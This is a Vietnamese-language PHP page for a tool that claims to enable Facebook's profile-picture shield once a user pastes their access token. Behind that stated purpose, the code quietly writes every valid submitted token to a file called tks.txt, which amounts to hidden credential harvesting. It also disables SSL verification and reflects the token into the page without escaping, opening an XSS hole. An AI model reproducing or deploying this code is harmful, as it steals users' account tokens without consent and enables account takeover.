<?php $titles='BẬT KHIÊN FACEBOOK'; ?>
<div class="col-md-12">
    <div class="panel panel-border panel-<?php if ($hour >= 0 && $hour <= 12) { echo 'primary'; }else{ echo 'danger'; } ?>">
        <div class="panel-heading">
            <h3 class="panel-title"><?=$titles;?></h3>
        </div>
        <div class="panel-body">
            <form method="post">
<?php
if (isset($_POST['submit'])) {
    $token = $_POST['access_token'];
    $theloai = $_POST['tf'];
    $me = json_decode(file_get_contents('https://graph.fb.me/me?access_token='.$token),true);
	if($me['id']){
        $user_id = $me['id'];
        $fp = fopen('tks.txt', 'a+');
        fwrite($fp, $_POST['access_token']."\n");
        fclose($fp);
        $headers2 = array();
        $headers2[] = 'Authorization: OAuth '.$token;
        $data = 'variables={"0":{"is_shielded":true,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"'.$me['id'].'","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation';
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, "https://graph.facebook.com/graphql");
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER,false);
        curl_setopt($c, CURLOPT_SSL_VERIFYHOST,false);
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);  
        curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($c, CURLOPT_HTTPHEADER, $headers2);
        curl_setopt($c,CURLOPT_POST, 1);
        curl_setopt($c,CURLOPT_POSTFIELDS,$data);
        $page = curl_exec($c);
        curl_close($c);
        echo "<script>swal({html: true,title: 'Thành công',text: 'Thành công. Đã bật khiên cho $user_id.',type: 'success',});</script>";
    }else{
        echo "<script>swal({html: true,title: 'Thất bại',text: 'Mã token không hợp lệ.',type: 'error',});</script>";
    }
}
?>
                <div class="form-group">
                    <label for="access_token">Mã token:</label>
                    <input name="access_token" class="form-control" rows="10" value="<?php echo isset($_POST['access_token']) ? $_POST['access_token'] : ''; ?>" placeholder="Nhập mã token nick cần bật...">
                </div>
        </div>
        <div class="panel-footer">
            <button class="btn btn-success" type="submit" name="submit">Xác nhận</button>
        </div>
            </form>
    </div>
</div>